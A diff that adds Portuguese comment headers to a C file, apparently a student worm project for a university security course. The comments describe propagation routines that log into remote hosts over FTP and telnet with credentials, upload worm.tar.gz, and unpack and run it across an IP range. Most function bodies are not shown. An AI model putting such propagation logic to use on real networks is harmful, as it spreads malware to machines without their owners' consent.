@@ -1,3 +1,11 @@
+//-------------------------------------------------------------------//
+// UNIVERSIDADE FEDERAL DO PARANÁ                                    //
+// HENRIQUE HEPP						     //
+// KATHERYNE LOUISE GRAF     					     //
+// CI301 - INTRODUÇÃO À SEGURANÇA COMPUTACIONAL                      //
+//-------------------------------------------------------------------//
+// BIBLIOTECAS
+//-------------------------------------------------------------------//
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -14,7 +22,9 @@
 #include <termios.h>
 #include <fcntl.h>
 #include <arpa/inet.h>
-
+//-------------------------------------------------------------------//
+// FUNÇÕES
+//-------------------------------------------------------------------//
 // Função que transforma um inteiro em char
 // É dependente da base do inteiro, para efetuar a conversão correta
 
@@ -27,6 +37,9 @@ char* intTochar(int val, int base){
 	
 	return &buf[i+1];
 }
+//-------------------------------------------------------------------//
+// Esta função pega os números passados no PASV e transforma em ip
+// e porta, para fazer a nova conexão para envio de dados
 
 void parseIPPort(char buffer[], char *ip, int *port){
     char *token = (char*) malloc(sizeof(char));
@@ -71,6 +84,10 @@ void parseIPPort(char buffer[], char *ip, int *port){
 
     *port = p1*256+p2;
 }
+//-------------------------------------------------------------------//
+// Esta função faz uma comunicação FTP via Socket, loga no computador
+// de forma remota e faz a transferencia do aruivo worm.tar.gz
+// que contem todos os arquivos do worm.
 
 void fileTransfer(char *ip, char *username, char *password){
     char buffer[1024];
@@ -317,6 +334,11 @@ void fileTransfer(char *ip, char *username, char *password){
         close(sock);
     }
 }
+//-------------------------------------------------------------------//
+// Esta função chama o TELNET, e usando o usuario e senha, loga no 
+// sistema remotamente, entra dentro da pasta que contem os arquivos
+// do worm, descompacta e executa mediante ao range de ip que 
+// foi passado anteriormente, na primeira execução
 
 void fileExecute(char *ip, char *username, char *pass, char range_ipSeq[], char range_portSeq[], int lenKey){
     char buff[1024];
@@ -411,6 +433,9 @@ void fileExecute(char *ip, char *username, char *pass, char range_ipSeq[], char 
     }
 
 }
+//-------------------------------------------------------------------//
+// Esta função é o "main" da propagation, sua tarefa é fazer a chamada
+// das funções responsaveis pelo envio e propagaçaõ dos dados.
 
 void propagation_engine(char* ip, char *username, char *pass, char range_ipSeq[], char range_portSeq[], int lenKey){        
     printf("\n******************************************\n");
@@ -421,3 +446,5 @@ void propagation_engine(char* ip, char *username, char *pass, char range_ipSeq[]
     fileExecute(ip, username, pass, range_ipSeq, range_portSeq, lenKey);
     printf("\n******************************************\n");
 }
+//-------------------------------------------------------------------//
+//-------------------------------------------------------------------//
